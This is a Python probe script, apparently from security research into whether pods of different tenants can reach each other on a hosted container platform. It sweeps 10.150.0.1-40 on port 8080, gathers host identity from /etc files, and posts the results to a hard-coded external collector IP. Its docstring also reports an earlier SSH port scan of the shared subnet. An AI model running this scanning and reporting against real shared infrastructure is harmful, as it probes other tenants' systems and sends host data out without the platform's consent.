#!/usr/bin/env python3
"""probe33 - tenant-to-tenant pod-network reachability, demonstrated with our own two apps only.

Findings so far: from inside one Aiven Runtime container, 10.150.0.0/24 answers on :22 for ~21 hosts
and on :80/:443 for a few. Those may be other tenants' pods or Aiven's own; either way, the only
defensible proof of a cross-tenant gap uses containers we own.

This probe:
  1. determines its own pod IPv4 (no `ip` binary in the image: UDP connect + getsockname),
  2. serves HTTP on 8080 with a marker body,
  3. POSTs its identity (node name, pod ip, hostname) to the collector,
  4. connects to 10.150.0.1-40:8080 and reports which peers answer and what they say.

Two instances of this same image on the same node prove or disprove tenant isolation without touching
anything we do not own: the peer it reaches is the other instance of itself.
"""
import json, os, socket, threading, time
from http.server import BaseHTTPRequestHandler, HTTPServer
from concurrent.futures import ThreadPoolExecutor

COLLECTOR = "http://208.87.134.252:9200/rt33"
RES = {"stage": "boot", "identity": {}, "peers": []}


def post():
    try:
        import urllib.request
        urllib.request.urlopen(urllib.request.Request(COLLECTOR, data=json.dumps(RES).encode(),
                               headers={"Content-Type": "application/json"}), timeout=15)
    except Exception as e:
        print("post failed:", e, flush=True)


def own_ip():
    for target in (("10.150.0.1", 9), ("1.1.1.1", 9)):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(3)
            s.connect(target)
            ip = s.getsockname()[0]
            s.close()
            if not ip.startswith("127."):
                return ip
        except Exception:
            pass
    return None


def hostname():
    try:
        return open("/etc/hostname").read().strip()
    except Exception:
        return "?"


def node_name():
    try:
        for line in open("/etc/hosts"):
            if "nc-" in line and "aiven-application" in line:
                return line.split()[1].split(".")[0]
    except Exception:
        pass
    return "?"


class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = json.dumps({"who": RES["identity"]}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


def serve():
    HTTPServer(("0.0.0.0", 8080), H).serve_forever()


def probe_peer(ip):
    s = socket.socket()
    s.settimeout(1.5)
    try:
        if s.connect_ex((ip, 8080)) != 0:
            return None
        s.sendall(b"GET / HTTP/1.0\r\nHost: peer\r\n\r\n")
        data = b""
        while len(data) < 400:
            chunk = s.recv(400)
            if not chunk:
                break
            data += chunk
        return {"ip": ip, "reply": data.decode("latin-1", "replace")[-300:]}
    except Exception:
        return None
    finally:
        s.close()


RES["identity"] = {"pod_ip": own_ip(), "hostname": hostname(), "node": node_name(), "pid": os.getpid()}
RES["stage"] = "listening"
post()
print("identity:", RES["identity"], flush=True)
threading.Thread(target=serve, daemon=True).start()
time.sleep(8)

RES["stage"] = "scanning peers"
post()
with ThreadPoolExecutor(max_workers=20) as ex:
    for r in ex.map(probe_peer, [f"10.150.0.{i}" for i in range(1, 41)]):
        if r:
            RES["peers"].append(r)
            print("peer:", r["ip"], r["reply"][:120].replace("\n", " "), flush=True)

RES["stage"] = "done"
post()
print("done; peers:", len(RES["peers"]), flush=True)
time.sleep(3600)
